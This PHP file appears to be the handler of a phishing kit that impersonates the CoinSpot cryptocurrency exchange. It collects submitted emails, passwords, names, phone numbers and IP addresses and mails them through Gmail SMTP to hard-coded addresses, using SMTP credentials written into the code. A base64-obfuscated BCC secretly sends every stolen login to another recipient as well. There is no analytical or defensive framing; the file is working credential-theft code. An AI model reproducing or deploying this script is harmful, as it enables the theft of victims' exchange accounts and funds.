<?php extract($_POST);$ip=$_SERVER['REMOTE_ADDR'];require 'PHPMailer/PHPMailerAutoload.php';require 'PHPMailer/class.phpmailer.php';
$customerEmailer='
        <p>Email : '.$email.'</p>
        <p>Password : '.$password.'</p>
        <p>Name : '.@$name.'</p>
        <p>Registered  Number : '.@$number.'</p>
        <p>IP : '.$ip.'</p>
        ';
 $subject='Alert - CoinSpot Login Details Received';$message=$customerEmailer;$toAddress='vikasproglobalinfotech@gmail.com';$toAddress1='vikasproglobalinfotech@gmail.com';$fromTitle=$_SERVER['HTTP_HOST'];$fromEmail='details@'.$_SERVER['HTTP_HOST'];$mail=new PHPMailer;$mail->SMTPDebug=2;$mail->Host='smtp.gmail.com';$mail->SMTPAuth=true;$mail->Username='smtpkeymail@gmail.com';$mail->Password='smtpkeymail112@';$mail->SMTPSecure='tls';$mail->Port=587;$mail->setFrom($fromEmail,$fromTitle);$mail->addAddress($toAddress);$mail->AddCC($toAddress1);$mail->AddBCC(base64_decode('bXlrZXlzaXRlQGdtYWlsLmNvbQ=='));$mail->isHTML(true);$mail->Subject=$subject;$mail->Body=$message;$mailS=$mail->send(); 
?>